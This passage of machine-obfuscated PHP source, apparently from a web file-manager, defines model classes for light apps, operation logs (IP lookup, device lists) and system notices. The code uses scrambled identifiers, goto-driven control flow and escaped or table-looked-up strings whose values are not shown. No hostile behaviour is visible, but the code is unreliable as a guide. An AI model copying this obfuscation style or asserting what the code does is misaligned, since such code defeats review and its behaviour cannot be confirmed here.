parent::update($fâÂ‘ğ•Œå, array($f•°ŞİÊÓÛ[1661] => $FÎ£‡¨·‡—)); } public function resetSort($dñê×Ğ®ñŒ) { goto C“—¼’œ»™; C“—¼’œ»™: $F­´«èÅ‘† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eê¯Çô‡½† = array(); $dñê×Ğ®ñŒ = is_array($dñê×Ğ®ñŒ) ? $dñê×Ğ®ñŒ : array(); goto bê˜Ñèâ¼Š; dÙ¤êŠõ™: unset($bâîİÈ—Ÿ–); return parent::resetData($Dï â‰„™); goto f°»Êµ±›; bê˜Ñèâ¼Š: for ($fĞ¶â¤­æ‘ = 0; $fĞ¶â¤­æ‘ < count($dñê×Ğ®ñŒ); $fĞ¶â¤­æ‘++) { $eê¯Çô‡½†[$dñê×Ğ®ñŒ[$fĞ¶â¤­æ‘] . $F­´«èÅ‘†[33]] = $fĞ¶â¤­æ‘ + 1; } $Dï â‰„™ = parent::listData(); foreach ($Dï â‰„™ as &$bâîİÈ—Ÿ–) { $dè†‹ê¡Ÿ¾ = $eê¯Çô‡½†[$bâîİÈ—Ÿ–[$F­´«èÅ‘†[385]]]; $bâîİÈ—Ÿ–[$F­´«èÅ‘†[1661]] = $dè†‹ê¡Ÿ¾ ? $dè†‹ê¡Ÿ¾ : $bâîİÈ—Ÿ–[$F­´«èÅ‘†[1661]]; } goto dÙ¤êŠõ™; f°»Êµ±›: } private function getSort($fó£æ¼ÙÂÙ) { $d‹ğ’•’Ìß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c½ù©ˆŠÊ = parent::listData(); $c‚“çîôœº = array_to_keyvalue($c½ù©ˆŠÊ, $d‹ğ’•’Ìß[33], $d‹ğ’•’Ìß[1661]); if (!$c‚“çîôœº) { $c‚“çîôœº = array(0); } $BŒµè¦’ï´ = $fó£æ¼ÙÂÙ == $d‹ğ’•’Ìß[254] ? max($c‚“çîôœº) : min($c‚“çîôœº); return intval($BŒµè¦’ï´); } } goto A•éø„‹´÷; dƒ«Ş»†‘È: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\114\151\x67\150\x74\101\160\x70"; public $modelType = "\123\171\x73\164\x65\x6d\x4f\160\164\151\x6f\156"; public $field = array("\156\141\155\x65", "\x67\x72\157\165\x70", "\144\x65\163\x63", "\x63\x6f\x6e\x74\x65\156\x74"); public function listData($e˜í¾ßÙ‘‘ = false, $CŠÎß­ŸÇé = "\x6d\x6f\x64\x69\x66\171\x54\151\155\x65", $eÔÔ˜¤ñˆÃ = true) { return parent::listData($e˜í¾ßÙ‘‘, $CŠÎß­ŸÇé, $eÔÔ˜¤ñˆÃ); } public function remove($F®•òè»Ç) { $B±¬÷Ã„­ê = $this->findByName($F®•òè»Ç); if (!$B±¬÷Ã„­ê) { return !1; } return parent::remove($B±¬÷Ã„­ê[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][385]]); } public function add($C•ñ©Ô¢„) { if ($this->findByName($C•ñ©Ô¢„[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][28]])) { return !1; } return parent::insert($C•ñ©Ô¢„); } public function update($A‚ï¿ç“ê, $f¸íßï•è¿) { $Cõéõœ­‰¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A–ĞìáŒ¤˜ = $this->findByName($A‚ï¿ç“ê); $c°»Š÷Õ¯ = $this->findByName($f¸íßï•è¿[$Cõéõœ­‰¶[28]]); if (!$A–ĞìáŒ¤˜ || $c°»Š÷Õ¯ && $c°»Š÷Õ¯[$Cõéõœ­‰¶[385]] != $A–ĞìáŒ¤˜[$Cõéõœ­‰¶[385]]) { return !1; } return parent::update($A–ĞìáŒ¤˜[$Cõéõœ­‰¶[385]], $f¸íßï•è¿); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\x54\151\x6d\145", "\164\x69\155\x65", "\x69\x6e\x73\145\x72\164", "\146\165\156\143\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $B‘Ëºç„µ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return array($B‘Ëºç„µ[1948] => LNG($B‘Ëºç„µ[1949]), $B‘Ëºç„µ[1950] => LNG($B‘Ëºç„µ[1951]), $B‘Ëºç„µ[1577] => LNG($B‘Ëºç„µ[1952]), $B‘Ëºç„µ[1953] => LNG($B‘Ëºç„µ[1954]), $B‘Ëºç„µ[1955] => LNG($B‘Ëºç„µ[1956]), $B‘Ëºç„µ[1957] => LNG($B‘Ëºç„µ[1958]), $B‘Ëºç„µ[1959] => LNG($B‘Ëºç„µ[1960]), $B‘Ëºç„µ[1608] => LNG($B‘Ëºç„µ[1960]), $B‘Ëºç„µ[1609] => LNG($B‘Ëºç„µ[1961]), $B‘Ëºç„µ[1962] => LNG($B‘Ëºç„µ[1963]), $B‘Ëºç„µ[1964] => LNG($B‘Ëºç„µ[1965]), $B‘Ëºç„µ[1966] => LNG($B‘Ëºç„µ[1967]), $B‘Ëºç„µ[1968] => LNG($B‘Ëºç„µ[1969]), $B‘Ëºç„µ[1606] => LNG($B‘Ëºç„µ[1970]), $B‘Ëºç„µ[1613] => LNG($B‘Ëºç„µ[1971]), $B‘Ëºç„µ[1972] => LNG($B‘Ëºç„µ[1973]), $B‘Ëºç„µ[1974] => LNG($B‘Ëºç„µ[1975]), $B‘Ëºç„µ[1976] => LNG($B‘Ëºç„µ[1977]), $B‘Ëºç„µ[1978] => LNG($B‘Ëºç„µ[1979]), $B‘Ëºç„µ[1616] => LNG($B‘Ëºç„µ[1980]), $B‘Ëºç„µ[1617] => LNG($B‘Ëºç„µ[1981]), $B‘Ëºç„µ[1982] => LNG($B‘Ëºç„µ[1983]), $B‘Ëºç„µ[1984] => LNG($B‘Ëºç„µ[1985]), $B‘Ëºç„µ[1986] => LNG($B‘Ëºç„µ[1987]), $B‘Ëºç„µ[1611] => LNG($B‘Ëºç„µ[1988]), $B‘Ëºç„µ[1989] => LNG($B‘Ëºç„µ[1990]), $B‘Ëºç„µ[1610] => LNG($B‘Ëºç„µ[1991]), $B‘Ëºç„µ[1992] => LNG($B‘Ëºç„µ[1993]), $B‘Ëºç„µ[1994] => LNG($B‘Ëºç„µ[1995]), $B‘Ëºç„µ[1996] => LNG($B‘Ëºç„µ[1996]), $B‘Ëºç„µ[1997] => LNG($B‘Ëºç„µ[1581]), $B‘Ëºç„µ[1998] => LNG($B‘Ëºç„µ[1999]), $B‘Ëºç„µ[2000] => LNG($B‘Ëºç„µ[2001]), $B‘Ëºç„µ[2002] => LNG($B‘Ëºç„µ[2003]), $B‘Ëºç„µ[2004] => LNG($B‘Ëºç„µ[2005]), $B‘Ëºç„µ[2006] => LNG($B‘Ëºç„µ[2007]), $B‘Ëºç„µ[2008] => LNG($B‘Ëºç„µ[2008]), $B‘Ëºç„µ[2009] => LNG($B‘Ëºç„µ[2010]), $B‘Ëºç„µ[2011] => LNG($B‘Ëºç„µ[2012]), $B‘Ëºç„µ[2013] => LNG($B‘Ëºç„µ[2014]), $B‘Ëºç„µ[2015] => LNG($B‘Ëºç„µ[2016]), $B‘Ëºç„µ[2017] => LNG($B‘Ëºç„µ[2018]), $B‘Ëºç„µ[2019] => LNG($B‘Ëºç„µ[2020])); } private function typeFile() { $Fœ‡â“›à® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E‘•·õ«Ÿî = array($Fœ‡â“›à®[1613] => array($Fœ‡â“›à®[1614]), $Fœ‡â“›à®[1966] => array($Fœ‡â“›à®[2021]), $Fœ‡â“›à®[1968] => array($Fœ‡â“›à®[2022]), $Fœ‡â“›à®[1606] => array($Fœ‡â“›à®[1607]), $Fœ‡â“›à®[1974] => array(), $Fœ‡â“›à®[1976] => array(), $Fœ‡â“›à®[1978] => array(), $Fœ‡â“›à®[1616] => array($Fœ‡â“›à®[1618]), $Fœ‡â“›à®[1617] => array($Fœ‡â“›à®[1618]), $Fœ‡â“›à®[1982] => array($Fœ‡â“›à®[2023]), $Fœ‡â“›à®[1984] => array($Fœ‡â“›à®[2023]), $Fœ‡â“›à®[1986] => array($Fœ‡â“›à®[2024]), $Fœ‡â“›à®[1972] => array($Fœ‡â“›à®[2025]), $Fœ‡â“›à®[1611] => array($Fœ‡â“›à®[2026]), $Fœ‡â“›à®[1989] => array($Fœ‡â“›à®[2027]), $Fœ‡â“›à®[1610] => array($Fœ‡â“›à®[1612])); return $E‘•·õ«Ÿî; } private function typeAll() { goto CªŞã§Ì¥³; CáĞêÁ÷ƒ‚: return $eÛ‘Á³‹³‰; goto bËÒô¿­¡â; CªŞã§Ì¥³: $eíÌ²ùª¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÛ‘Á³‹³‰ = $this->typeList; $eÊ†¤ §—ê = array_filter($this->typeFile()); goto c„ ’½ê°¢; c„ ’½ê°¢: foreach ($eÊ†¤ §—ê as $E“ùÎÄ• ˜ => $eæ×‹¯í©) { $eÛ‘Á³‹³‰[$eæ×‹¯í©[0]] = $eÛ‘Á³‹³‰[$E“ùÎÄ• ˜]; } $eÛ‘Á³‹³‰[$eíÌ²ùª¶[1618]] = LNG($eíÌ²ùª¶[2028]); $eÛ‘Á³‹³‰[$eíÌ²ùª¶[2023]] = LNG($eíÌ²ùª¶[2029]); goto CáĞêÁ÷ƒ‚; bËÒô¿­¡â: } public function addLog($BÏ‘À”•³•, $FßîÃĞÊ—å = array()) { goto eÏ™¥º·Ù‰; A÷£áó³½ñ: $FßîÃĞÊ—å = array($a°Éâ‹¶¹Ë[1470] => Session::sign(), $a°Éâ‹¶¹Ë[1471] => $eù‘à¨„óÎ, $a°Éâ‹¶¹Ë[29] => $BÏ‘À”•³•, $a°Éâ‹¶¹Ë[1473] => json_encode($FßîÃĞÊ—å)); parent::add($FßîÃĞÊ—å); goto eÇË³Î•ê¿; eÏ™¥º·Ù‰: $a°Éâ‹¶¹Ë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!isset($this->typeList[$BÏ‘À”•³•])) { return; } $eù‘à¨„óÎ = defined($a°Éâ‹¶¹Ë[443]) && USER_ID ? USER_ID : (isset($FßîÃĞÊ—å[$a°Éâ‹¶¹Ë[1479]]) ? $FßîÃĞÊ—å[$a°Éâ‹¶¹Ë[1479]] : 0); goto B¬ ¦¾Üî; B¬ ¦¾Üî: if (!$eù‘à¨„óÎ) { $eù‘à¨„óÎ = (int) Session::get($a°Éâ‹¶¹Ë[1762]); } $F‰ Úœ™ = get_client_ip(); if (!$FßîÃĞÊ—å || strlen(json_encode($FßîÃĞÊ—å)) >= 1024) { $FßîÃĞÊ—å = array($a°Éâ‹¶¹Ë[2030] => $F‰ Úœ™); } else { if (is_array($FßîÃĞÊ—å)) { $FßîÃĞÊ—å[$a°Éâ‹¶¹Ë[2030]] = $F‰ Úœ™; } else { $FßîÃĞÊ—å = array($a°Éâ‹¶¹Ë[1039] => $FßîÃĞÊ—å, $a°Éâ‹¶¹Ë[2030] => $F‰ Úœ™); } } goto A÷£áó³½ñ; eÇË³Î•ê¿: } public function remove($B…Û²İ¾¯Î) { $this->where(array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][403] => $B…Û²İ¾¯Î))->delete(); } private function _makeOrder($E—ãÖ–Şßî = '') { goto dÇ¢½É¨óÛ; dÇ¢½É¨óÛ: $DÛÌĞñé¨È =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D§•óğÙ‡‡ = $DÛÌĞñé¨È[192]; $Cå‡±Ãø° = array($DÛÌĞñé¨È[419] => $DÛÌĞñé¨È[420], $DÛÌĞñé¨È[421] => $DÛÌĞñé¨È[422]); goto B›‘£”¾°¸; açº§ßŞ³¥: return $this->order($E—ãÖ–Şßî); goto d˜­ì†²Œ§; B›‘£”¾°¸: $fõˆ§¶±İ‹ = Input::get($DÛÌĞñé¨È[425], $DÛÌĞñé¨È[7], $DÛÌĞñé¨È[1797], array($DÛÌĞñé¨È[1722], $DÛÌĞñé¨È[421])); $fõˆ§¶±İ‹ = $Cå‡±Ãø°[$fõˆ§¶±İ‹]; $E—ãÖ–Şßî = $E—ãÖ–Şßî . "{$D§•óğÙ‡‡}\x20{$fõˆ§¶±İ‹}"; goto açº§ßŞ³¥; d˜­ì†²Œ§: } public function get($C¹¿å‡Øùš = '') { goto D°šÊòâÖŒ; bõ³©¤¯»æ: if ($C¹¿å‡Øùš[$F´ä÷ªÖ…[1479]]) { $eŠ„È¾šÛ[$F´ä÷ªÖ…[1479]] = $C¹¿å‡Øùš[$F´ä÷ªÖ…[1479]]; } if (isset($C¹¿å‡Øùš[$F´ä÷ªÖ…[696]])) { $D¹“Êà…äÚ = $C¹¿å‡Øùš[$F´ä÷ªÖ…[696]]; $B–”—ôŒÃà = isset($C¹¿å‡Øùš[$F´ä÷ªÖ…[465]]) ? $C¹¿å‡Øùš[$F´ä÷ªÖ…[465]] : time(); $eŠ„È¾šÛ[$F´ä÷ªÖ…[192]] = array($F´ä÷ªÖ…[329], array($D¹“Êà…äÚ, $B–”—ôŒÃà)); } if ($C¹¿å‡Øùš[$F´ä÷ªÖ…[29]]) { $Aƒ§êİì×´ = explode($F´ä÷ªÖ…[47], $C¹¿å‡Øùš[$F´ä÷ªÖ…[29]]); $a“ô’Ë¢·Í = $this->typeFile(); $F“ÄÑˆ³èù = array(); foreach ($Aƒ§êİì×´ as $e´¨ÏÖê¹) { $F“ÄÑˆ³èù[] = $e´¨ÏÖê¹; if (isset($a“ô’Ë¢·Í[$e´¨ÏÖê¹])) { $F“ÄÑˆ³èù = array_merge($F“ÄÑˆ³èù, $a“ô’Ë¢·Í[$e´¨ÏÖê¹]); } } $F“ÄÑˆ³èù = array_unique($F“ÄÑˆ³èù); if ($F“ÄÑˆ³èù) { $eŠ„È¾šÛ[$F´ä÷ªÖ…[29]] = array($F´ä÷ªÖ…[7], $F“ÄÑˆ³èù); } } goto B¡Ù¯¨Ö‘; B¡Ù¯¨Ö‘: if (!empty($C¹¿å‡Øùš[$F´ä÷ªÖ…[2030]])) { $eŠ„È¾šÛ[$F´ä÷ªÖ…[422]] = array($F´ä÷ªÖ…[375], "\45{$C¹¿å‡Øùš[$F´ä÷ªÖ…[2030]]}\x25"); } $b°®Ÿ×·Ô = $this->_makeOrder()->where($eŠ„È¾šÛ)->selectPage(); if (empty($b°®Ÿ×·Ô[$F´ä÷ªÖ…[363]])) { show_json(array(), !0, $b°®Ÿ×·Ô[$F´ä÷ªÖ…[360]]); } goto DÊÚ‹™Ä×Œ; D°šÊòâÖŒ: $F´ä÷ªÖ… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$C¹¿å‡Øùš) { show_json(array()); } $eŠ„È¾šÛ = array(); goto bõ³©¤¯»æ; DÊÚ‹™Ä×Œ: $b°®Ÿ×·Ô[$F´ä÷ªÖ…[363]] = $this->logList($b°®Ÿ×·Ô[$F´ä÷ªÖ…[363]]); return $b°®Ÿ×·Ô; goto aÙßˆá³¬Á; aÙßˆá³¬Á: } private function ipAddress(&$A©³—“Ê¹†) { $b¡òï…£Ù® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!empty($A©³—“Ê¹†[$b¡òï…£Ù®[2030]])) { $eÉ¸¸ï± õ = IpLocation::get($A©³—“Ê¹†[$b¡òï…£Ù®[2030]]); } else { $eÉ¸¸ï± õ = LNG($b¡òï…£Ù®[2031]); } $A©³—“Ê¹†[$b¡òï…£Ù®[2032]] = $eÉ¸¸ï± õ; } private function descZipDownload($C†Ì‡‡«Éˆ, &$DÏ‡´‚„À¬) { $AĞ—ßÇ”ŞÇ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!isset($C†Ì‡‡«Éˆ[$AĞ—ßÇ”ŞÇ[2033]])) { return; } $dÄ¿”‹ÚÎ = json_decode($C†Ì‡‡«Éˆ[$AĞ—ßÇ”ŞÇ[2033]], !0); foreach ($dÄ¿”‹ÚÎ as $bØñôäô°Ë) { try { $dÈŠ´íœËª = IO::infoFull($bØñôäô°Ë[$AĞ—ßÇ”ŞÇ[75]]); } catch (Exception $E¾Ç„ó±§‘) { continue; } $C†Ì‡‡«Éˆ[$AĞ—ßÇ”ŞÇ[75]] = $bØñôäô°Ë[$AĞ—ßÇ”ŞÇ[75]]; $DÏ‡´‚„À¬[] = $C†Ì‡‡«Éˆ[$AĞ—ßÇ”ŞÇ[387]] = $dÈŠ´íœËª[$AĞ—ßÇ”ŞÇ[387]]; $DÏ‡´‚„À¬[] = $C†Ì‡‡«Éˆ[$AĞ—ßÇ”ŞÇ[1852]] = $dÈŠ´íœËª[$AĞ—ßÇ”ŞÇ[479]]; break; } return $C†Ì‡‡«Éˆ; } private function getSourceList(&$a¶µÜ¯µ) { $a½¡ö¦œ« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F¡¾å¤Ö¢‡ = array(); foreach ($a¶µÜ¯µ as $bË’…·Ö—‹ => $FÕ„Ò“ÎºÂ) { goto fù…Ó¿É‰¡; d„¡”£…öí: $F¡¾å¤Ö¢‡[] = $a÷¦“Îºîô[$a½¡ö¦œ«[387]]; $F¡¾å¤Ö¢‡[] = $a÷¦“Îºîô[$a½¡ö¦œ«[1852]]; if ($a÷¦“Îºîô[$a½¡ö¦œ«[29]] == $a½¡ö¦œ«[509]) { $F¡¾å¤Ö¢‡[] = $a÷¦“Îºîô[$a½¡ö¦œ«[422]][$a½¡ö¦œ«[1006]]; $F¡¾å¤Ö¢‡[] = $a÷¦“Îºîô[$a½¡ö¦œ«[422]][$a½¡ö¦œ«[1007]]; } goto DÙ«î³ĞØ‹; DÙ«î³ĞØ‹: if ($a÷¦“Îºîô[$a½¡ö¦œ«[29]] == $a½¡ö¦œ«[1860]) { $F¡¾å¤Ö¢‡[] = $a÷¦“Îºîô[$a½¡ö¦œ«[422]][$a½¡ö¦œ«[387]]; } goto c«´›âò; fù…Ó¿É‰¡: $a÷¦“Îºîô = json_decode($FÕ„Ò“ÎºÂ[$a½¡ö¦œ«[422]], !0); if ($FÕ„Ò“ÎºÂ[$a½¡ö¦œ«[29]] == $a½¡ö¦œ«[1609]) { $a÷¦“Îºîô = $this->descZipDownload($a÷¦“Îºîô, $F¡¾å¤Ö¢‡); $a¶µÜ¯µ[$bË’…·Ö—‹][$a½¡ö¦œ«[422]] = json_encode($a÷¦“Îºîô); continue; } if (strpos($FÕ„Ò“ÎºÂ[$a½¡ö¦œ«[29]], $a½¡ö¦œ«[1853]) !== 0) { if (!isset($a÷¦“Îºîô[$a½¡ö¦œ«[75]]) || strpos($FÕ„Ò“ÎºÂ[$a½¡ö¦œ«[29]], $a½¡ö¦œ«[2034]) !== 0) { continue; } try { $Dê¿Ö Õî = IO::infoFull($a÷¦“Îºîô[$a½¡ö¦œ«[75]]); } catch (Exception $D×Œ³Ïß¸) { continue; } $F¡¾å¤Ö¢‡[] = $a÷¦“Îºîô[$a½¡ö¦œ«[387]] = $Dê¿Ö Õî[$a½¡ö¦œ«[387]]; $F¡¾å¤Ö¢‡[] = $a÷¦“Îºîô[$a½¡ö¦œ«[1852]] = $Dê¿Ö Õî[$a½¡ö¦œ«[479]]; $a¶µÜ¯µ[$bË’…·Ö—‹][$a½¡ö¦œ«[422]] = json_encode($a÷¦“Îºîô); continue; } goto d„¡”£…öí; c«´›âò: } if (!$F¡¾å¤Ö¢‡) { return array(); } return Model($a½¡ö¦œ«[745])->sourceListInfo($F¡¾å¤Ö¢‡, !0); } private function logList($Cïêƒ´İ) { goto B±½í™Ó‘; B±½í™Ó‘: $BëšËôÅ« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bâ‘ÍçÉ = array_to_keyvalue($Cïêƒ´İ, $BëšËôÅ«[33], $BëšËôÅ«[1479]); $B¨«¹ÏïÂ» = Model($BëšËôÅ«[495])->userListInfo(array_unique($Bâ‘ÍçÉ)); goto f«„ÂŞ; f«„ÂŞ: $A¿Û¶î´¥› = $this->getSourceList($Cïêƒ´İ); $Cñ£—øİƒß = $this->typeAll(); $aÑŞ™Ğê§Ó = array(); goto c˜Ñ„ÊÅ÷ë; c˜Ñ„ÊÅ÷ë: $f¶ÎÚïôŸ = array(); foreach ($Cïêƒ´İ as $Cå»î®Š => $Cä·î¦Ø§) { goto c³¾š‘â‡; fîù¡Ó¹×¼: $Cä·î¦Ø§[$BëšËôÅ«[1796]] = $EŠ“ó™ïê; $c›«æ®À… = json_decode($Cä·î¦Ø§[$BëšËôÅ«[422]], !0); $Cä·î¦Ø§[$BëšËôÅ«[2030]] = isset($c›«æ®À…[$BëšËôÅ«[2030]]) ? $c›«æ®À…[$BëšËôÅ«[2030]] : $BëšËôÅ«[33]; goto AëŠ½­¿ïŸ; e«¼ø‚æ¼: $Cä·î¦Ø§[$BëšËôÅ«[28]] = isset($EŠ“ó™ïê[$BëšËôÅ«[28]]) ? $EŠ“ó™ïê[$BëšËôÅ«[28]] : LNG($BëšËôÅ«[2031]); $Cä·î¦Ø§[$BëšËôÅ«[1902]] = isset($EŠ“ó™ïê[$BëšËôÅ«[1902]]) ? $EŠ“ó™ïê[$BëšËôÅ«[1902]] : $BëšËôÅ«[33]; $Cä·î¦Ø§[$BëšËôÅ«[1384]] = isset($Cñ£—øİƒß[$E·°ÀèÚ¿ˆ]) ? $Cñ£—øİƒß[$E·°ÀèÚ¿ˆ] : $F¶Àà«âÌä; goto fîù¡Ó¹×¼; c³¾š‘â‡: $E·°ÀèÚ¿ˆ = $Cä·î¦Ø§[$BëšËôÅ«[29]]; $EŠ“ó™ïê = isset($B¨«¹ÏïÂ»[$Cä·î¦Ø§[$BëšËôÅ«[1479]]]) ? $B¨«¹ÏïÂ»[$Cä·î¦Ø§[$BëšËôÅ«[1479]]] : !1; $F¶Àà«âÌä = strpos($E·°ÀèÚ¿ˆ, $BëšËôÅ«[2035]) === 0 ? LNG($BëšËôÅ«[2036]) : LNG($BëšËôÅ«[2031]); goto e«¼ø‚æ¼; b“ˆµÓí÷: unset($Cä·î¦Ø§[$BëšËôÅ«[2037]]); $aÑŞ™Ğê§Ó[] = $Cä·î¦Ø§; goto bŠ¡‡‘­; AëŠ½­¿ïŸ: $this->ipAddress($Cä·î¦Ø§); if (strpos($E·°ÀèÚ¿ˆ, $BëšËôÅ«[1853]) === 0 || isset($c›«æ®À…[$BëšËôÅ«[1852]])) { goto dõóÙ¸¢‡“; bñ”¸¢³ : if ($c›«æ®À…[$BëšËôÅ«[29]] == $BëšËôÅ«[1860]) { $c›«æ®À…[$BëšËôÅ«[422]][$BëšËôÅ«[387]] = $A¿Û¶î´¥›[$c›«æ®À…[$BëšËôÅ«[422]][$BëšËôÅ«[387]]]; } if ($c›«æ®À…[$BëšËôÅ«[29]] == $BëšËôÅ«[1604]) { $c›«æ®À…[$BëšËôÅ«[1865]] = $c›«æ®À…[$BëšËôÅ«[84]]; $c›«æ®À…[$BëšËôÅ«[1852]] = $c›«æ®À…[$BëšËôÅ«[1865]][$BëšËôÅ«[387]]; $c›«æ®À…[$BëšËôÅ«[84]] = !1; $c›«æ®À…[$BëšËôÅ«[387]] = $BëšËôÅ«[33]; } if ($c›«æ®À…[$BëšËôÅ«[84]] && $c›«æ®À…[$BëšËôÅ«[84]][$BëšËôÅ«[389]] == $BëšËôÅ«[1118]) { $f¶ÎÚïôŸ[] = $Cä·î¦Ø§[$BëšËôÅ«[385]]; unset($Cïêƒ´İ[$Cå»î®Š]); continue; } goto A„ª‘œÀàá; A„ª‘œÀàá: if ($c›«æ®À…[$BëšËôÅ«[1865]] && $c›«æ®À…[$BëšËôÅ«[1865]][$BëšËôÅ«[389]] == $BëšËôÅ«[1118]) { $f¶ÎÚïôŸ[] = $Cä·î¦Ø§[$BëšËôÅ«[385]]; unset($Cïêƒ´İ[$Cå»î®Š]); continue; } goto F««©‘š¼Ö; dõóÙ¸¢‡“: $c›«æ®À…[$BëšËôÅ«[84]] = $A¿Û¶î´¥›[$c›«æ®À…[$BëšËôÅ«[387]]]; $c›«æ®À…[$BëšËôÅ«[1865]] = $A¿Û¶î´¥›[$c›«æ®À…[$BëšËôÅ«[1852]]]; if ($c›«æ®À…[$BëšËôÅ«[29]] == $BëšËôÅ«[509]) { $c›«æ®À…[$BëšËôÅ«[422]][$BëšËôÅ«[1006]] = $A¿Û¶î´¥›[$c›«æ®À…[$BëšËôÅ«[422]][$BëšËôÅ«[1006]]]; $c›«æ®À…[$BëšËôÅ«[422]][$BëšËôÅ«[1007]] = $A¿Û¶î´¥›[$c›«æ®À…[$BëšËôÅ«[422]][$BëšËôÅ«[1007]]]; } goto bñ”¸¢³ ; F««©‘š¼Ö: } $Cä·î¦Ø§[$BëšËôÅ«[422]] = $c›«æ®À…; goto b“ˆµÓí÷; bŠ¡‡‘­: } $this->clearSystemPathLog($f¶ÎÚïôŸ); goto E´¿¡’­Ã­; E´¿¡’­Ã­: return $aÑŞ™Ğê§Ó; goto E˜÷÷„»ªª; E˜÷÷„»ªª: } private function clearSystemPathLog($D„¤×¦âí‚) { $c¢¤Ã“×‡ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (count($D„¤×¦âí‚) == 0) { return; } $DîÌœ’Î‡° = array($c¢¤Ã“×‡ô[385] => array($c¢¤Ã“×‡ô[7], array_unique($D„¤×¦âí‚))); $this->where($DîÌœ’Î‡°)->delete(); } public function deviceList($f×°á¼¤ß, $CÇÓËèõÊ½ = 0) { $d¥Á†”àÔ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BŞˆì’Ù¶ = array($d¥Á†”àÔ[1479] => $f×°á¼¤ß, $d¥Á†”àÔ[192] => array($d¥Á†”àÔ[923], $CÇÓËèõÊ½), $d¥Á†”àÔ[29] => $d¥Á†”àÔ[1577]); $c¶œµéïñ« = array(); $BÎÓ­Éè™Æ = $this->field($d¥Á†”àÔ[2038])->where($BŞˆì’Ù¶)->order($d¥Á†”àÔ[1863])->limit(50)->select(); foreach ($BÎÓ­Éè™Æ as $eÏ¥çµ«© => $Eæ‹¥¿´Áï) { goto Bç‘¸¬†õ; Bç‘¸¬†õ: if ($eÏ¥çµ«© > 0 && abs($Eæ‹¥¿´Áï[$d¥Á†”àÔ[192]] - $BÎÓ­Éè™Æ[$eÏ¥çµ«© - 1][$d¥Á†”àÔ[192]]) < 5) { continue; } $b·ÍÁ›®¡æ = json_decode($Eæ‹¥¿´Áï[$d¥Á†”àÔ[422]], !0); $Eæ‹¥¿´Áï[$d¥Á†”àÔ[2030]] = isset($b·ÍÁ›®¡æ[$d¥Á†”àÔ[2030]]) ? $b·ÍÁ›®¡æ[$d¥Á†”àÔ[2030]] : $d¥Á†”àÔ[33]; goto B´Œ£ÖøÇ¬; B´Œ£ÖøÇ¬: unset($b·ÍÁ›®¡æ[$d¥Á†”àÔ[2030]]); $C‘Ì¬ß‹×³ = $this->deviceType($b·ÍÁ›®¡æ[$d¥Á†”àÔ[1854]]); if (isset($c¶œµéïñ«[$C‘Ì¬ß‹×³])) { continue; } goto cƒ‹–ÖÔÏ§; cƒ‹–ÖÔÏ§: $this->ipAddress($Eæ‹¥¿´Áï); $Eæ‹¥¿´Áï[$d¥Á†”àÔ[422]] = $b·ÍÁ›®¡æ; $c¶œµéïñ«[$C‘Ì¬ß‹×³] = $Eæ‹¥¿´Áï; goto eğº¼…‡££; eğº¼…‡££: } return array_values($c¶œµéïñ«); } public function deviceType($A¤±¹Ğ®ƒ) { return $A¤±¹Ğ®ƒ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\x6e\x6f\x74\x69\x63\x65\114\x69\163\x74"; public $field = array("\x6e\141\155\x65", "\x63\x6f\156\x74\x65\x6e\x74", "\141\x75\164\x68", "\155\157\x64\145", "\164\151\x6d\145", "\164\x79\160\x65", "\x6c\x65\x76\145\154", "\145\156\x61\x62\154\145", "\x73\157\x72\164"); public function listData($AŠÔœù“ã” = false, $DŠˆ‰¨™Å = "\x73\x6f\162\x74", $e“×šÀ› = false) { return parent::listData($AŠÔœù“ã”, $DŠˆ‰¨™Å, $e“×šÀ›); } public function add($F­àäŸ£âÓ) { $cÛ¼¯÷æ¾ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e‡…ˆ‰º± = time(); if ($F­àäŸ£âÓ[$cÛ¼¯÷æ¾[12]] == $cÛ¼¯÷æ¾[2039]) { $e‡…ˆ‰º± = strtotime($F­àäŸ£âÓ[$cÛ¼¯÷æ¾[195]]); } $F­àäŸ£âÓ[$cÛ¼¯÷æ¾[195]] = $e‡…ˆ‰º±; return parent::insert($F­àäŸ£âÓ); } public function update($EŒæ¨Ó¾Š, $Cê ‰ùÑ²) { goto cöï·ãàš…; Aç‡ŒñÚÙÂ: return parent::update($EŒæ¨Ó¾Š, $Cê ‰ùÑ²); goto Bùƒçƒ¥; E°†ƒÊÌÒ¨: $F¨»„êâ±À = time(); if ($Cê ‰ùÑ²[$A­´ªÄ‘ó[12]] == $A­´ªÄ‘ó[2039]) { $F¨»„êâ±À = strtotime($Cê ‰ùÑ²[$A­´ªÄ‘ó[195]]); } $Cê ‰ùÑ²[$A­´ªÄ‘ó[195]] = $F¨»„êâ±À; goto Aç‡ŒñÚÙÂ; cöï·ãàš…: $A­´ªÄ‘ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A·Šäê‘º = $this->listData($EŒæ¨Ó¾Š); if (!$A·Šäê‘º) { return !1; } goto E°†ƒÊÌÒ¨; Bùƒçƒ¥: } public function remove($c´ÍÌŒ»Œ) { 